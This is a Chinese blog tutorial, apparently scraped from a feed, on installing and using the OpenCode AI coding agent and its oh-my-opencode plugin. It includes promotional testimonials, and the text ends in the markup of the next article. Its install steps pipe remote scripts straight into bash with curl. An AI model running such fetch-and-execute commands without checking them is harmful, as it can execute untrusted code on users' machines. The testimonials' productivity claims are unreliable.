.hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">OpenCode</h2>
<h3 data-id="heading-1">是什么</h3>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">opencode.ai/</a></p>
<p>GitHub 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanomalyco%2Fopencode" target="_blank" title="https://github.com/anomalyco/opencode" ref="nofollow noopener noreferrer">github.com/anomalyco/o…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/107d0d55dd774578ad9f8ccebd6c2a27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=hTRUUOU%2FHDCWv3%2BdmeeQxy6A5XU%3D" alt="" loading="lazy"/></p>
<p><strong>官方介绍：</strong></p>
<blockquote>
<p>OpenCode is an open source agent that helps you write and run code with any AI model. It's available as a terminal-based interface, desktop app, or IDE extension.</p>
<p>OpenCode 是一款开源智能体，可助力你搭配任意 AI 模型编写并运行代码。它支持终端界面、桌面应用程序以及集成开发环境（IDE）扩展三种使用形式。</p>
</blockquote>
<p>同时它内置免费模型，亦可接入任意服务商提供的各类模型，包括 Claude、GPT、Gemini 等。</p>
<p><strong>一句话概括：</strong> OpenCode <strong>是一个开源 AI 编码助手，以 CLI 为中心、强调“工程可控性”的 AI 编码工具</strong>，目标不是取代 IDE，而是让 <strong>大模型真正进入代码工程与研发流程</strong>，成为可组合、可审计、可自动化的一部分。</p>
<p><strong>流行度如何？</strong></p>
<p>GitHub 最新 Star ：68k ，你可能看到的大于这个数，因为他一直在变化。。。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftrendshift.io%2F" target="_blank" title="https://trendshift.io/" ref="nofollow noopener noreferrer">trendshift.io/</a> 上 GitHub 趋势排名第一，可见流行程度</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60e11256bfcc4cf0973d6e754bb24dec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=L6I9nUSlaFQipd0YD6NVDSS2yII%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cceeefd133548ed84e510a247aee999~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=lzyc8t4bRJyxyqgDWT54xMqYGaM%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be91c8c6f2f54d838e5308c60cc64faa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=a1aHam7bkemZbghxAs7KjHCetGc%3D" alt="" loading="lazy"/></p>
<p><strong>可以用来干些啥？</strong></p>
<p>OpenCode 适合做所有“需要理解代码上下文，但不需要你立刻改代码”的事情。</p>
<p>换句话说：<strong>凡是“看代码、分析代码、总结代码、约束代码、生成文本”的工作，都是 OpenCode 的主战场。</strong></p>
<p>应用场景举例</p>
<ul>
<li>管理多种 AI 模型（Claude、ChatGPT、Gemini、GLM-4.7等 <strong>75</strong>+ 模型）</li>
<li>分析代码、解释代码、生成代码</li>
<li>生成新功能、修改和优化项目</li>
<li>自动 Code Review</li>
<li>自动生成 Commit Message</li>
<li>PR / MR 总结与描述生成</li>
<li>代码解释与知识沉淀</li>
<li>架构 / 规范一致性检查</li>
<li>...</li>
</ul>
<h3 data-id="heading-2">如何安装</h3>
<p>官方提供了多种 CLI 的安装方式，例如 curl、pnm、bun、brew、paru</p>
<p>这里使用 curl 安装</p>
<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//opencode.ai/install | bash</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b80515b776b84609a38378c61dd54b77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=Qx%2FEqR0gtROvdONhO2uK%2BQ1fft8%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db1b514173f44990abc3d1a7fef3debd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=6iZVhyRLrOdGimP%2BCUfZafOMD%2FQ%3D" alt="" loading="lazy"/></p>
<p>通过下面的命令查看版本，我使用的是 1.1.19 版本</p>
<pre><code class="hljs language-css" lang="css">opencode <span class="hljs-attr">--version</span>
</code></pre>
<h3 data-id="heading-3">如何使用</h3>
<h4 data-id="heading-4">启动</h4>
<p>直接输入 opencode 命令即可，如果 opencode 命令找不到，重新开一个新的 tab 执行即可</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb466962fce040c38a2b2fb367a42bf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=TgUrBZZS2rqCPMM4fB6VJNYQFeg%3D" alt="" loading="lazy"/></p>
<p>或者通过下面的命令重启终端</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">source</span> ~/.bashrc  <span class="hljs-comment"># 如果是bash终端</span>
<span class="hljs-comment"># 或</span>
<span class="hljs-built_in">source</span> ~/.zshrc   <span class="hljs-comment"># 如果是zsh终端（Mac默认）</span>
</code></pre>
<p>输入<code>/</code>命令，查看所有内置命令</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5581cab931ed4f60a5f059a962d7cf8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=k3saeGFCkFcVcktiTd%2BIFaehKdI%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">选择 model</h4>
<p>输入<code>/models</code> 查看所有支持的模型，模型名称支持模糊搜索，通过键盘上下箭头进行选择进行模型切换</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3d03ff7127f4cf5a2ffd2f34d0919bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=thgNAxm%2Fz5MSaTdp6g3Fvh2ONlk%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f22d63382d324bce91e8d70c28167688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=MYOYVZad6ZN7hOo%2F3ENWIbZJGHM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">添加 LLM provider</h4>
<p>通过 <code>/connect</code> 命令直接添加，也可以先输入 <code>/models</code> 查看所有支持的模型，输入 ctrl + a 可以添加其他模型提供商</p>
<p>支持通过 API keys 的方法直接添加，也支持通过第三方网页授权的方式添加，例如 GitHub Copilot 就是这样</p>
<p>这里添加一下 GitHub Copilot 测试，安装下面引导添加即可</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eea4f26912bf48ae9e24740fd48194bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=kWR7j3UwceG4jdO6b4XikhvUAl4%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fec8fb9306b54886a2c8916ef6e5fcd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=ZbE41o3pFnB9LrtXIF7M5BV56Vc%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d64bd9ca6c644ba6b41aeb84a0ea71c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=2RUYy686XbNvePThqXemwPQHuA0%3D" alt="" loading="lazy"/></p>
<p>添加完成，通过 <code>/models</code> 查看模型是可用，下面可以看到以 <strong>GitHub Copilot</strong> 的名称，下面展示了所有的模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f87ba9d74dd4ef88ffaadd4b4a12e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=VRs2MOfphPhQtnKER8Nq891TTSo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-7">初始化</h4>
<p>进入到项目目录中</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /path/to/project
</code></pre>
<p>运行 opencode</p>
<pre><code class="hljs">opencode
</code></pre>
<p>使用下面命令，初始化 opencode 项目</p>
<pre><code class="hljs language-bash" lang="bash">/init
</code></pre>
<p>这个命令会让 OpenCode 分析你的项目，然后在项目的根目录创建一个 <code>AGENTS.md</code> 的文件</p>
<p>这个文件有助于帮助 OpenCode 了解项目结构和已使用的编码风格</p>
<h3 data-id="heading-8">使用演示</h3>
<h4 data-id="heading-9">case1: 让 OpenCode 给你解释代码</h4>
<blockquote>
<p>Tips: 通过 <code>@</code> 关键词模糊搜索项目文件，支持 tab 自动补全文件</p>
</blockquote>
<pre><code class="hljs language-kotlin" lang="kotlin">How <span class="hljs-keyword">is</span> authentication handled <span class="hljs-keyword">in</span> <span class="hljs-meta">@packages</span>/functions/src/api/index.ts
</code></pre>
<h4 data-id="heading-10">case2: 构建功能</h4>
<blockquote>
<p>Tips：OpenCode 支持通过直接拖拽图片到终端作为提示词</p>
</blockquote>
<p>OpenCode 支持2种模式，Plan 和 Build。2种模式通过 <code>TAB</code>键进行切换</p>
<p>Plan 模式只会产生方案的计划，Build 会执行 Plan 的方案，最终执行代码修改。</p>
<p>官方建议先使用 Plan 模式来创建计划，用户 Review 来不停迭代 Plan 直至没有问题，再通过 Build 模式执行</p>
<p>当然也可以通过 Build 模式直接构建，跳过 Plan 到过程。</p>
<h4 data-id="heading-11">case3: 撤销更改</h4>
<p>通过 <code>/undo</code> 命令撤销上一次的提交，你可以通过 <code>/undo</code> 撤销多次，这个命令有点像在 IDE 编辑一部分代码后。</p>
<p>按下了撤销快捷键，例如 mac 上一般是 CMD + Z，连续按多次这个快捷键，可以撤销多次，相当于执行了多次 <code>/undo</code> 命令。</p>
<p>也可以通过 <code>/redo</code> 再次提交刚才撤销的提交</p>
<h4 data-id="heading-12">case4: 分享</h4>
<p>通过 <code>/share</code> 命令将会话分享给你的团队，执行完命令，会直接将分享的链接拷贝到你的剪切板中，并在终端的右上角弹出提示“Share URL copied to clipboard！”</p>
<p>下面示例 URL：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopncd.ai%2Fshare%2Fe7xeuVL5" target="_blank" title="https://opncd.ai/share/e7xeuVL5" ref="nofollow noopener noreferrer">opncd.ai/share/e7xeu…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/380f5066d3514eeab9d9bbaedeb1d84d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=9tOqn90hQJpg6%2BSy0bisk1NdMb0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">支持的命令</h3>
<p>输入下面命令，查看所有支持的命令</p>
<pre><code class="hljs">opencode -h
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1696ef47ce2941afbcacec811e3b05d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=4xvIFhTLvle2B%2BkGHrAwz7dE3iA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14"><strong>oh-my-opencode</strong></h2>
<h3 data-id="heading-15"><strong>是什么</strong></h3>
<p><strong>官方介绍：</strong></p>
<blockquote>
<p>The Best Agent Harness. Meet Sisyphus: The Batteries-Included Agent that codes like you.</p>
<p><strong>最佳智能体开发框架。来认识 Sisyphus：一款开箱即用、编码风格与你如出一辙的智能体工具。</strong></p>
<p>GitHub 地址 ：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode" ref="nofollow noopener noreferrer">github.com/code-yeongy…</a></p>
</blockquote>
<p>用大白话说，它是 OpenCode 的增强插件（类似 oh-my-zsh 对于 zsh 的增强），它为 OpenCode 添加了更多强大功能：</p>
<ul>
<li>多 AI 模型协作：可以同时调用多个 AI 模型协同工作</li>
<li>智能体系统（Agents）：内置多个专业智能体（如 frontend-ui-ux-engineer、oracle 等）</li>
<li>提示词优化：自动优化你给 AI 的指令</li>
<li>后台任务管理：可以并行执行多个任务</li>
</ul>
<p>简单理解：安装 oh-my-opencode 插件后，OpenCode 就从一个 AI 助手变成了一个完整的 AI 开发团队。</p>
<p><strong>它有哪些智能体队友：</strong></p>
<ul>
<li>Sisyphus (<code>anthropic/claude-opus-4-5</code>)：默认智能体。 OpenCode 的强大 AI 编排器。使用专业子智能体进行规划、委派和执行复杂任务，采用积极的并行执行策略。强调后台任务委派和 todo 驱动的工作流程。使用 Claude Opus 4.5 配合扩展思考（32k 预算）以获得最大推理能力。</li>
<li>oracle (<code>openai/gpt-5.2</code>)：架构、代码审查、策略。使用 GPT-5.2 进行出色的逻辑推理和深度分析。灵感来自 AmpCode。</li>
<li>librarian (<code>opencode/glm-4.7-free</code>)：多仓库分析、文档查找、实现示例。使用 GLM-4.7 Free 进行深度代码库理解和 GitHub 研究，提供基于证据的答案。灵感来自 AmpCode。</li>
<li>explore (<code>opencode/grok-code</code>、<code>google/gemini-3-flash</code> 或 <code>anthropic/claude-haiku-4-5</code>)：快速代码库探索和模式匹配。配置 Antigravity 认证时使用 Gemini 3 Flash，有 Claude max20 时使用 Haiku，否则使用 Grok。灵感来自 Claude Code。</li>
<li>frontend-ui-ux-engineer (<code>google/gemini-3-pro-preview</code>)：设计师转开发者。构建华丽的 UI。Gemini 擅长创造性的、美观的 UI 代码。</li>
<li>document-writer (<code>google/gemini-3-flash</code>)：技术写作专家。Gemini 是文字大师——写出流畅的散文。</li>
<li>multimodal-looker (<code>google/gemini-3-flash</code>)：视觉内容专家。分析 PDF、图像、图表以提取信息。</li>
</ul>
<p>主智能体会自动调用这些，但你也可以显式调用它们：</p>
<pre><code class="hljs language-less" lang="less">让 <span class="hljs-variable">@oracle</span> 审查这个设计并提出架构
让 <span class="hljs-variable">@librarian</span> 看看这是如何实现的——为什么行为一直在变化？
让 <span class="hljs-variable">@explore</span> 查找这个功能的策略
</code></pre>
<p><strong>用户评价</strong></p>
<blockquote>
<p>它让我取消了 Cursor 订阅。开源社区正在发生令人难以置信的事情。" - <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Farthur_guiot%2Fstatus%2F2008736347092382053%3Fs%3D20" target="_blank" title="https://x.com/arthur_guiot/status/2008736347092382053?s=20" ref="nofollow noopener noreferrer">Arthur Guiot</a></p>
<p>"如果 Claude Code 能在 7 天内完成人类 3 个月的工作，那么 Sisyphus 只需 1 小时。它会持续工作直到任务完成。它是一个非常自律的智能体。" — B, 量化研究员</p>
<p>"用 Oh My Opencode 仅用一天就清理了 8000 个 eslint 警告" — <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fjacobferrari_%2Fstatus%2F2003258761952289061" target="_blank" title="https://x.com/jacobferrari_/status/2003258761952289061" ref="nofollow noopener noreferrer">Jacob Ferrari</a></p>
<p>"我使用 Ohmyopencode 和 ralph loop 在一夜之间将一个 45k 行的 tauri 应用转换成了 SaaS Web 应用。从访谈提示开始，要求它对问题进行评分和建议。看着它工作非常精彩，今早醒来发现网站基本上已经可以运行了！" - <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fhargabyte%2Fstatus%2F2007299688261882202" target="_blank" title="https://x.com/hargabyte/status/2007299688261882202" ref="nofollow noopener noreferrer">James Hargis</a></p>
<p>"用了 oh-my-opencode，你再也不会回头了" — <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fd0t3ch%2Fstatus%2F2001685618200580503" target="_blank" title="https://x.com/d0t3ch/status/2001685618200580503" ref="nofollow noopener noreferrer">d0t3ch</a></p>
<p>"我还没能准确表达出它为什么如此出色，但开发体验已经达到了一个完全不同的维度。" - <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkokesuzuri%2Fstatus%2F2008532913961529372%3Fs%3D20" target="_blank" title="https://x.com/kokesuzuri/status/2008532913961529372?s=20" ref="nofollow noopener noreferrer">苔硯:こけすずり</a></p>
<p>"这个周末用 open code、oh my opencode 和 supermemory 来构建某种 minecraft/souls-like 怪物游戏。" "让它添加蹲伏动画，我去散个午后的步。[视频]" - <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FMagiMetal%2Fstatus%2F2005374704178373023" target="_blank" title="https://x.com/MagiMetal/status/2005374704178373023" ref="nofollow noopener noreferrer">MagiMetal</a></p>
<p>"你们应该把这个合并到核心代码并招募他。认真的。这真的非常非常非常好。" — Henning Kilset</p>
<p>"如果你能说服他的话就雇用 @yeon_gyu_kim，这个人彻底革新了 opencode。" — <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmysticaltech%2Fstatus%2F2001858758608376079" target="_blank" title="https://x.com/mysticaltech/status/2001858758608376079" ref="nofollow noopener noreferrer">mysticaltech</a></p>
<p>"Oh My OpenCode 真的太疯狂了" - <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DG_Snfh2M41M" target="_blank" title="https://www.youtube.com/watch?v=G_Snfh2M41M" ref="nofollow noopener noreferrer">YouTube - Darren Builds AI</a></p>
</blockquote>
<h3 data-id="heading-16">如何安装</h3>
<p><strong>1.直接通过 OpenCode 安装</strong></p>
<p>你只需跟OpenCode说：<code>帮我安装 oh-my-opencode 插件</code></p>
<p>他会思考 oh-my-opencode 是什么，搜索如何安装，然后再基于搜索到的资料进行<strong>自动安装</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4de78a70f4b44befa88aefd363237ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=nRwiUF0Ds9BZ7rp%2BSEsrV0EoAdA%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be5f7e9c8c3a4a9fb5d5da423383de8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=kPEFVcMbtCgxAmaOuUDKVh5iGz4%3D" alt="" loading="lazy"/></p>
<p>他会使用内置 Exa MCP 进行联网搜索，找到具体的安装步骤，下面是安装成功后效果</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca5df1aa3bc14f83b608f003723d82b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=5aMVli2WF7ilHAXhTNHgpmqpWuQ%3D" alt="" loading="lazy"/><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc5deee1c24e432aa9235403eab0380b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=akD2o%2F0ypcuu7%2FQRv%2B%2FVL8F8X6k%3D" alt="" loading="lazy"/></p>
<p><strong>2.通过 CLI</strong></p>
<p>我这里介绍通过 bun 工具来进行安装，其他方式可以参考 GitHub 官方文档</p>
<ol>
<li>先安装 bun 工具</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//bun.sh/install | bash</span>
</code></pre>
<p>验证 bun 安装是否成功，输出版本号代表安装成功，例如我安装的版本是 1.3.6</p>
<p>安装 bun 完成后，重启你的终端（必须重启，环境变量才生效），执行以下命令：</p>
<pre><code class="hljs">bun -v
</code></pre>
<p>2.  再安装 oh-my-opencode</p>

<pre><code class="hljs language-perl" lang="perl">npx oh-<span class="hljs-keyword">my</span>-opencode install
</code></pre>
<p>验证 oh-my-opencode 是否安装成功，输出版本号代表安装成功，例如我安装的版本是 2.13.2</p>
<pre><code class="hljs language-perl" lang="perl">oh-<span class="hljs-keyword">my</span>-opencode -v
</code></pre>
<h3 data-id="heading-17">如何使用</h3>
<p>输入下面命令，查看所有支持的命令</p>
<pre><code class="hljs language-perl" lang="perl">oh-<span class="hljs-keyword">my</span>-opencode -h
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7f38446e02b49f8a90fc0fd6f5e537b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3J1b2Zlbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768986918&amp;x-signature=L8WcHyN2lp0ThuM02J9iAWgffuY%3D" alt="" loading="lazy"/></p>
<p>详细使用查看官方介绍：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode%2Fblob%2Fdev%2FREADME.zh-cn.md" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode/blob/dev/README.zh-cn.md" ref="nofollow noopener noreferrer">github.com/code-yeongy…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS手动代码混淆函数和变量名基本原理和注意事项教程]]></title>    <link>https://juejin.cn/post/7594854295758143531</link>    <guid>https://juejin.cn/post/7594854295758143531</guid>    <pubDate>2026-01-14T06:58:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295758143531" data-draft-id="7594801581003554852" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS手动代码混淆函数和变量名基本原理和注意事项教程"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T06:58:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aiopencode"/> <meta itemprop="url" content="https://juejin.cn/user/1898230261493865"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS手动代码混淆函数和变量名基本原理和注意事项教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1898230261493865/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aiopencode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:58:23.000Z" title="Wed Jan 14 2026 06:58:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body 